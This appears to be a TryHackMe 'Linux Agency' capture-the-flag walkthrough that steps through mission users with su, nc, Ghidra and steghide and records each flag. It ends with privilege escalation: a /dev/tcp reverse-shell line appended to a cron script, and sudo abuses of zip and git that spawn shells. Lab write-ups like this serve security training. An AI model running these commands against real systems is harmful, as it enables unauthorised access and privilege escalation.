# FINISH - Linux Agency

**Room Link:** [https://tryhackme.com/room/linuxagency](https://tryhackme.com/room/linuxagency)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

## TCP/21 - SSH

**Kali**

```
ssh agent47@$VICTIM
Password: 640509040147
```

<figure><img src="../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
grep -r "mission" /home/ 2>/dev/null

su mission1
Password: mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```

<figure><img src="../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

**Victim(mission1)**

```
cd /home/mission1
ls

su mission2
Password: mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```

<figure><img src="../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

**Victim(mission2)**

```
cd /home/mission2
cat flag.txt

su mission3
Password: mission3{ab1e1ae5cba688340825103f70b0f976}
```

<figure><img src="../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

**Victim(mission3)**

```
cd /home/mission3
cat flag.txt
nano flag.txt

su mission4
Password: mission4{264a7eeb920f80b3ee9665fafb7ff92d}
```

<figure><img src="../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

**Victim(mission4)**

```
cd /home/mission4/flag
cat flag.txt

su mission5
Password: mission5{bc67906710c3a376bcc7bd25978f62c0}
```

<figure><img src="../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

**Victim(mission5)**

```
cd /home/mission4/
cat .flag.txt

su mission6
Password: mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```

<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

**Victim(mission6)**

```
cd /home/mission5/
cat .flag/flag.txt 

su mission7
Password: mission7{53fd6b2bad6e85519c7403267225def5}
```

<figure><img src="../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

**Victim(mission7)**

```
cd /home/mission7/
cat flag.txt 

su mission8
Password: mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```

**Victim(mission8)**

```
cd /
cat flag.txt 

su mission9
Password: mission9{ba1069363d182e1c114bef7521c898f5}
```

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

**Victim(mission9)**

```
cd /home/mission8/
grep "mission10" rockyou.txt 

su mission10
Password: mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```

<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

**Victim(mission10)**

```
cd /home/mission9/
grep -r "mission" . 2>/dev/null

su mission11
Password: mission11{db074d9b68f06246944b991d433180c0}
```

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

**Victim(mission11)**

```
cd /home/mission11/
env

su mission12
Password: mission12{f449a1d33d6edc327354635967f9a720}
```

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

**Victim(mission12)**

```
cd /home/mission12/
chmod +r flag.txt
cat flag.txt

su mission13
Password: mission13{076124e360406b4c98ecefddd13ddb1f}
```

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

**Victim(mission13)**

```
cd /home/mission13/
cat flag.txt
echo 'bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=' | base64 -d

su mission14
Password: mission14{d598de95639514b9941507617b9e54d2}
```

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

**Victim(mission14)**

```
cd /home/mission14/
cat flag.txt

su mission15
Password: mission15{fc4915d818bfaeff01185c3547f25596}
```

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

**Victim(mission15)**

```
cd /home/mission15/
cat flag.txt

su mission16
Password: mission16{884417d40033c4c2091b44d7c26a908e}
```



<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

**Victim(mission16)**

```
cd /home/mission16/
chmod flag
./flag

su mission17
Password: mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

**Victim(mission17)**

```
cd /home/mission17/
ls
javac flag.java
ls
java flag

su mission18
Password: mission18{f09760649986b489cda320ab5f7917e8}
```

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

**Victim(mission18)**

```
cd /home/mission18/
ls
ruby flag.rb 

su mission19
Password: mission19{a0bf41f56b3ac622d808f7a4385254b7}
```

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

**Victim(mission19)**

```
cd /home/mission19/
ls
gcc flag.c
ls
./a.out 

su mission20
Password:  mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

**Victim(mission20)**

```
cd /home/mission20/
ls
python flag.py 

su mission21
Password: mission21{7de756aabc528b446f6eb38419318f0c}
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission21)**

```
python -c 'import pty; pty.spawn("/bin/bash")'

su mission22
Password: mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission22)**

```
import pty; pty.spawn("/bin/bash")
cd /home/mission22/
ls
cat flag.txt

su mission23
Password: mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission23)**

```
cd /home/mission23/
ls
cat message.txt
grep -r "mission" /var/www/html/ 2>/dev/null

su mission24
Password: mission24{dbaeb06591a7fd6230407df3a947b89c}
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission24)**

```
cd /home/mission24
ls
./bribe
```

**Kali**

```
nc -l -p 1234 > bribe
```

**Victim(mission24)**

```
nc -w 3 $KALI 1234 < bribe
```

In Ghidra we can we there is a environment variable called pocket that needs to be set, if it's set to money it will run the if statement to show the flag

**Kali**

```
ghidra
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission24)**

```
export pocket=money
./bribe

su mission25
Password: mission25{61b93637881c87c71f220033b22a921b}
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Most commands don't work, I couldn't ls or cat files

**Victim(mission25)**

```
cd /home/mission25
echo "$(</home/mission25/flag.txt )"

exit
su mission26
Password: mission26{cb6ce977c16c57f509e9f8462a120f00}
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission26)**

```
cd /home/mission26
ls
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -l -p 1234 > flag.jpg
```

**Victim(mission26)**

```
nc -w 3 $KALI 1234 < flag.jpg
```

**Kali**

```
nc -l -p 1234 > flag.jpg
steghide extract -sf flag.jpg 
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission26)**

```
su mission27
Password: mission27{444d29b932124a48e7dddc0595788f4d}
```

**Victim(mission27)**

```
cd /home/mission27
ls
gzip -d flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png


su mission28
Password: mission28{03556f8ca983ef4dc26d2055aef9770f}
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission28)**

```
Dir.entries("/home/mission28/")
File.read("/home/mission28/txt.galf").reverse

exit
su mission29
Password: mission29{8192b05d8b12632586e25be74da2fff1}
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(mission29)**

```
cd /home/mission29/bludit
grep -r "mission" . 2>/dev/null

su mission30
Password: mission30{d25b4c9fac38411d2fcb4796171bda6e}
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim(mission30)**

```
ls -lah /home/mission30/Escalator/
cd /home/mission30/Escalator/
git log --pretty=oneline

su viktor
Password: viktor{b52c60124c0f8f85fe647021122b3d9a}
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(viktor)**

```
cat /etc/crontab


su viktor
Password:
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

Add reverse shell to script, I kept having to check and readd until dalia ran the script as there is another cronjob that resets the script

**Victim(viktor)**

```
echo "sh -i >& /dev/tcp/10.10.171.224/1337 0>&1" >> /opt/scripts/47.sh
cat /opt/scripts/47.sh
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(dalia)**

```
ls
cat flag.txt
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

Dalia can run the zip command as silvio

**Exploit:** [https://gtfobins.github.io/gtfobins/zip/](https://gtfobins.github.io/gtfobins/zip/)

**Victim(dalia)**

```
sudo -l
TF=$(mktemp -u)
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(silvia)**

```
python -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Exploit:**&#x20;

**Victim(silvia)**

```
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

